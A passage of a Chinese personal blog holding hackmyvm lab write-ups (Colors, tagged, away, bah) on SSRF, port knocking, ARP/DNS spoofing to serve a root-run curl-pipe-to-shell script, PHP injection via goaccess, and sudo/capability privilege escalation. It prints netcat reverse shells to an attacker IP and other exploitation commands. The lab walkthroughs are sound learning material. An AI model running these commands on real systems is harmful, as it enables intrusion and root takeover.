<h4 id="web代码复盘"><a href="#web代码复盘" class="headerlink" title="web代码复盘"></a>web代码复盘</h4><p>在games.php找到跳转explainmepls.php的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$money</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$game</span> != <span class="number">8</span>) &#123; <span class="comment">// 这里就是需要money=0，所以要把钱输光</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$game</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Shell_game&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Russian_roulette&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Dice&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include_once</span> <span class="string">&quot;./games/error.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: explainmepls.php?learnabout=&#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2001.00.46.png" ></p>
<p>触发ssrf漏洞的地方，“<code>file_get_contents()</code> 函数用于从指定的 URL 中获取内容并将其输出。可以通过控制 <code>$learnabout</code> 变量来构造任意 URL”</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>wp说pass那块第一个密码可用angr模块解决，我自己看的时候先想到的是z3，最后也解出来了，后续要学一下</p>
<p>最开始那个赌博游戏也是经过一番探索才找到ssrf那个点，而且刚找到的时候还以为是文件包含（知识不够牢固）关于ssrf利用，端口的fuzz也需要记住，还有就是最后文件打开那块，还能通过lsof找到相关进程，感觉这个思路以后还会遇到，也算是多学习到linux有关的知识了，总的来说这个靶场很值得学习回顾。</p>
<p>所需知识点：ssrf漏洞利用，文件逆向，z3求解，linux进程号查找，端口扫描</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Colors复盘</title>
    <url>/2024/03/20/hackmyvm-Colors%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶场涉及的知识点比较多，思路是大部分学习其他师傅的wp的，写复盘是想记录思路顺便回顾学好每个知识点。</p>
<h4 id="启动前准备"><a href="#启动前准备" class="headerlink" title="启动前准备"></a>启动前准备</h4><p>由于<strong>网卡配置不同</strong>，我每次都需要开靶机刚开启的时候shift+e进入grub编辑，给一个root的&#x2F;bin&#x2F;bash启动编辑一下&#x2F;etc&#x2F;netwrok&#x2F;interfaces里面的网卡配置，这是前置背景。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.92</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到21、22、80端口，并且22端口被过滤了（注意这里要用root扫如果用普通用户扫扫不到22端口信息）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
<p>先访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
<p>只有一张图片，扫目录一无所获，也对图片分析不出什么内容</p>
<p>看看21号端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
<p>看起来可以用anonymous登陆，登陆一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
<p>把secret.jpg下载下来，使用stegseek分析一波</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
<p>搞出来一段字符，在cyberchef分析，是base85</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
<p>得到一个pink的账号密码，这个时候我的思路是去登陆22端口，但是它的端口filted，后来去看了wp才知道这里有一个端口敲门，ftp那里就给了提示（好神奇的点子）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
<p>1127，1039，1081分别对应first，second，third敲门顺序，按顺序敲门端口才会打开，类似情况之前做vuln的DC系列的靶机也遇到过。</p>
<h5 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h5><p>知道了这个思路，我按照常规思路knock三个端口，然而22端口没有按照预期的打开，我试了很多次，还是失败，也不知道原因。第二天为了想实践后面的关卡，想着干脆关了防火墙，所以借助grub登陆root，按照网上给的命令总是失败，更头疼了。然后就想看看knock的配置文件，找到日志文件，一看到enp0s3我就想到要改成enp01，思路就来了。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
<p>于是经过一番搜索，找到&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.service，把里面的enp0s3改成enp0s1，再启动靶机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
<p>这次就可以了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
<p>虽然这个问题是针对自己的电脑产生的，别人的电脑可能不会出现这样的情况，但是整个过程是自己一点一点摸索到，最后成功解决的时候真的很开心，所以值得记录一下。</p>
<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>ok解决了ssh的问题，想用之前拿到的pink账号密码登陆，还是失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
<p>报错说publickey，说明需要密钥文件登陆。搞半天pink的账号密码可以用ftp登陆，对ftp的敏感度还不够，一直没想到，登陆后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
<p>pink目录下有.ssh目录，<strong>思路是在里面上传自己kali的id_rsa.pub（命名为authorized_keys)，然后用那个文件为凭证自己kali登陆ssh</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
<p>登陆成功</p>
<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><p>拿到pink的shell后没能发现什么，接下来的思路是去到&#x2F;var&#x2F;www&#x2F;html上传一个a.php，再在网页端访问a.php，就拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
<p>Sudo -l查看到green有vim可以利用提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>

<p>再输入’:!&#x2F;bin&#x2F;sh’，成功拿到green的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>

<p>到green到家目录下大致可以利用的就是test_4_green，下载到本地，ida打开查看一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
<p>注意到有个jnz比较</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
<p>大致就是比较v8和v7，这里用ida修改一下jnz为jz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
<p>保存后再执行，随便输入一个数字也会爆出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
<p>接着就登陆purple账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>

<p>sudo -l发现有个脚本可以用，就是要下载masterddos.hmv下的attack.sh然后交给&#x2F;usr&#x2F;bin&#x2F;sh 执行</p>
<p><strong>思路是利用dns欺骗，让靶机向自己的kali发送请求，自己的kali伪造一个attack.sh，让靶机访问</strong></p>
<p>步骤：</p>
<p>先在修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns文件，增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>

<p>然后开始dns攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>

<p>在靶机去ping masterddos.hmv，回复的ip是kali的ip，DNS欺骗执行成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>

<p>接着就sudo &#x2F;attack_dir&#x2F;ddos.sh执行脚本</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
<p>成功拿到root的shell，提权成功。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到<strong>DNS欺骗</strong>，学到了，通过ftp敲门那里思路比较清奇，要打破惯性思维，不要一看到账号密码只想到ssh的网页，还有ftp！可执行文件修改（二进制方向的魅力），knock开端口（注意网卡配置），还有一般都是先拿到www-data再拿到其他账户的shell，这次是先有个pink才有www-data。</p>
<p>这么理下来知识点也不是特别多，但我就要消化好久，自己做的时候没办法想到的思路无非就是因为知识面不够广，还有就是脑子不够灵活（比如没想到拿账号密码登陆ftp），路漫漫。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm 思路复盘2</title>
    <url>/2024/03/21/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%862/</url>
    <content><![CDATA[<h3 id="tagged"><a href="#tagged" class="headerlink" title="tagged"></a>tagged</h3><p>靶机ip：192.168.64.98</p>
<p>扫到有80端口和7746端口，然后到了80端口一访问就提示tagged.hmv，第一时间配置hosts文件，然后看到源码有一句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tagged.hmv</span><br><span class="line"></span><br><span class="line">&lt;!-- http://xxx.tagged.hmv :D --&gt;</span><br></pre></td></tr></table></figure>

<p>自然就想到了扫子域名，结果扫不到，然后扫了目录，扫到了index.php，report.php，report.html但是没有内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235025.png" ></p>
<p>访问index.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235123.png" ></p>
<h5 id="第一个点"><a href="#第一个点" class="headerlink" title="第一个点"></a>第一个点</h5><p><strong>借助7746端口配合index.php反弹shell</strong></p>
<p>不知道是些什么东西，在这里就被卡住了，看了题解才明白，<strong>当我们nc连接7746端口时输入的数据会被写入到index.php中</strong>，所以后来再访问index.php会出现很乱的东西，就是nmap扫描的时候留下的记录（而且7746端口被nmap扫描后会关闭，重启靶机就好了），我们自己连接7746端口发送数据验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235415.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-21%2023.54.35.png" ></p>
<p>是成功的，其实现在回看可以在最上面看到nmap，如果做的时候能有多一些联想就好了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235555.png" ></p>
<p>接下来就是给7746端口发送php命令反弹shell，再访问index.php，就能接收到了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235737.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240321235755.png" ></p>
<h5 id="第二个点"><a href="#第二个点" class="headerlink" title="第二个点"></a>第二个点</h5><p><strong>分析代码，顺应逻辑拿到用户的shell</strong></p>
<p>拿到了www-data的shell，在html目录下，有个.go文件，拿给ai分析一下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span>     <span class="comment">// 用于提供读取输入的帮助函数</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>       <span class="comment">// 提供格式化输入输出功能</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span>       <span class="comment">// 提供网络编程功能</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span>        <span class="comment">// 提供操作系统功能</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span>       <span class="comment">// 提供日志功能</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>   <span class="comment">// 用于执行外部命令</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span>   <span class="comment">// 提供字符串处理功能</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 监听TCP连接在7746端口</span></span><br><span class="line">    ln, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:7746&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 接受连接</span></span><br><span class="line">        conn, _ := ln.Accept()</span><br><span class="line">        <span class="comment">// 启动两个并发的goroutine来处理接收和发送数据</span></span><br><span class="line">        <span class="keyword">go</span> receiveData(conn)</span><br><span class="line">        <span class="keyword">go</span> sendData(conn, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送数据到客户端的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendData</span><span class="params">(conn net.Conn, mensaje <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 将消息发送到连接</span></span><br><span class="line">    fmt.Fprintf(conn, mensaje)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 接收来自客户端的数据并处理的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receiveData</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> tohtml <span class="type">string</span></span><br><span class="line">        <span class="comment">// 发送提示符给客户端</span></span><br><span class="line">        sendData(conn, <span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="comment">// 读取客户端发送的消息</span></span><br><span class="line">        message, _ := bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment">// 去除消息末尾的换行符</span></span><br><span class="line">        message = strings.TrimRight(message, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="comment">// 将消息格式化为HTML格式</span></span><br><span class="line">        tohtml = <span class="string">&quot;&lt;pre&gt;&quot;</span> + message + <span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line">        <span class="comment">// 如果收到特定消息，则执行外部命令</span></span><br><span class="line">        OMG := <span class="string">&quot;Deva&quot;</span></span><br><span class="line">        <span class="keyword">if</span> message == OMG &#123;</span><br><span class="line">            cmd := exec.Command(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7777&quot;</span>)</span><br><span class="line">            _ = cmd.Run()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打开文件用于追加，并将HTML消息写入文件</span></span><br><span class="line">        file, err := os.OpenFile(<span class="string">&quot;/var/www/html/index.php&quot;</span>, os.O_APPEND|os.O_WRONLY, <span class="number">0644</span>)</span><br><span class="line">        _, _ = fmt.Fprintln(file, tohtml)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Fatal(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭文件</span></span><br><span class="line">        <span class="keyword">defer</span> file.Close()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用一是展示了向7746端口输入信息会被写入到index.php，二是让我们知道，当我们向7746端口发送“Deva”时，靶机会向本地的7777端口反弹一个shell，那么接下来就是给7746端口发送信息，同时在刚拿到的shell开启7777端口监听</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000433.png" ></p>
<p>顺利拿到shyla的账户</p>
<h5 id="第三个点"><a href="#第三个点" class="headerlink" title="第三个点"></a>第三个点</h5><p><strong>借助goaccess给report.php标题写入恶意代码，再免密码执行</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322000556.png" ></p>
<p>sudo -l看到有goaccess和report.php（空的）可以利用，查了goaccess的作用，是一个可以实现可视化的web日志分析工具，查看了帮助文档，研究半天没有思路，最后看wp知道以下三个比较可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f --log-file=&lt;filename&gt;        - Path to input log file.</span><br><span class="line">-o --output=file.html|json|csv  - Output either an HTML, JSON or a CSV file.</span><br><span class="line">--html-report-title=&lt;title&gt;     - Set HTML report page title and header.</span><br></pre></td></tr></table></figure>

<p>先随便在当前目录下创建一个a.log，然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>以uma的身份执行goaccess，分析a.log然后把结果写到report.html，标题写入php代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shyla@tagged:~$ <span class="built_in">ls</span></span><br><span class="line">a.log  magiccode  user.txt</span><br><span class="line">shyla@tagged:~$ sudo -u uma goaccess -f a.log -o /var/www/html/report.html --html-report-title=<span class="string">&quot;&lt;?php system(&#x27;bash&#x27;);?&gt;&quot;</span></span><br><span class="line">shyla@tagged:~$ sudo /usr/bin/php /var/www/html/report.php</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@tagged:/home/shyla<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) grupos=0(root)</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h3 id="away"><a href="#away" class="headerlink" title="away"></a>away</h3><p>开了80和22端口，访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322003701.png" ></p>
<p>给了一个用户名，下面的东西是ED25519密钥生成时产生的界面，大概就是提示和这种类型的密钥有关（整个靶场都和这个有关系）。</p>
<p>拿到了用户名尝试爆破出tula的ssh密码，然而他需要私钥文件登陆，查询了一下ED25519密钥的私钥文件名是id_ed25519，现在就需要找到这个密钥文件，扫目录扫半天扫不出东西，看了wp才知道，直接就放在了网页目录下。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004502.png" ></p>
<p>拿到后保存到本地，有了私钥文件登陆还需要密码（在公钥文件写了）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004638.png" ></p>
<p>成功拿到第一个shell</p>
<p>sudo -l看到可以免密码用lula运行webhook，查看帮助文档</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322004921.png" ></p>
<p>需要用到的是 -hooks和-verbosre，需要一个json文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005017.png" ></p>
<p>在github找到了这个项目，中间可以写一个自己的sh文件，我写了一个&#x2F;tmp&#x2F;a.sh，然后编辑.json文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:/tmp$ <span class="built_in">cat</span> a.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc -e /bin/bash 192.168.64.3 8888</span><br><span class="line">tula@away:/tmp$ <span class="built_in">cd</span></span><br><span class="line">tula@away:~$ <span class="built_in">ls</span></span><br><span class="line">hooks.json  user.txt</span><br><span class="line">tula@away:~$ <span class="built_in">cat</span> hooks.json</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cleanup-webhook&quot;</span>,</span><br><span class="line">    <span class="string">&quot;execute-command&quot;</span>: <span class="string">&quot;/tmp/a.sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;command-working-directory&quot;</span>: <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>然后就开启了服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tula@away:~$ sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose</span><br><span class="line">[webhook] 2024/03/21 17:54:24 version 2.6.9 starting</span><br><span class="line">[webhook] 2024/03/21 17:54:24 setting up os signal watcher</span><br><span class="line">[webhook] 2024/03/21 17:54:24 attempting to load hooks from hooks.json</span><br><span class="line">[webhook] 2024/03/21 17:54:24 os signal watcher ready</span><br><span class="line">[webhook] 2024/03/21 17:54:24 found 1 hook(s) <span class="keyword">in</span> file</span><br><span class="line">[webhook] 2024/03/21 17:54:24 	loaded: cleanup-webhook</span><br><span class="line">[webhook] 2024/03/21 17:54:24 serving hooks on http://0.0.0.0:9000/hooks/&#123;<span class="built_in">id</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候还没弹到shell，还要访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.64.97:9000/hooks/cleanup-webhook</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322005703.png" ></p>
<p>成功拿到lula的shell，搜寻提权方法，用**&#x2F;usr&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null**查到more有read_and_search权限</p>
<p>接下来的思路是利用more读取&#x2F;root&#x2F;.ssh下的私钥文件，依旧是id_ed25519，保存下来ssh登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240322010551.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lula@away:/tmp$ ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">ssh root@127.0.0.1 -i id_ed25519</span><br><span class="line">Linux away 5.10.0-15-amd64 <span class="comment">#1 SMP Debian 5.10.120-1 (2022-06-09) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jun 17 11:14:38 2022</span><br><span class="line">root@away:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h3 id="bah"><a href="#bah" class="headerlink" title="bah"></a>bah</h3><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Bah" >https://hackmyvm.eu/machines/machine.php?vm=Bah<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：192.168.64.105</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到80和3306端口，先看看80，是个qdpm框架，他有一个密码暴露的poc（<a class="link"   href="https://www.exploit-db.com/exploits/50176%EF%BC%89" >https://www.exploit-db.com/exploits/50176）<i class="fas fa-external-link-alt"></i></a></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105323.png"   style="zoom:50%;" >

<p>访问‘&#x2F;core&#x2F;config&#x2F;databases.yml’，下载到一个yml文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105519.png" ></p>
<p>可以看到账号密码，用来登陆mysql</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105601.png" ></p>
<p>看到hidden数据库比较可疑</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105700.png"   style="zoom:50%;" >

<p>得到一批url和账号密码，先把url都保存成字典，然后fuff一下</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325110024.png"   style="zoom:50%;" >

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -c -r -u http://192.168.64.105 -H &quot;HOST: FUZZ&quot;  -w url.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-25%2011.01.44.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>可以看到party.bah.hmv比较不一样，配置一个hosts文件然后访问，是一个网页版终端，用之前拿到的yml文件里面的账号密码登陆，查看&#x2F;etc&#x2F;passwd，发现有个rocio用户，前面数据库查询中有拿到他的密码，直接切换用户</p>
<p>做了一些常规的搜寻，没找到怎么提权方式，下载一个pspy64看看，发现</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111440.png" ></p>
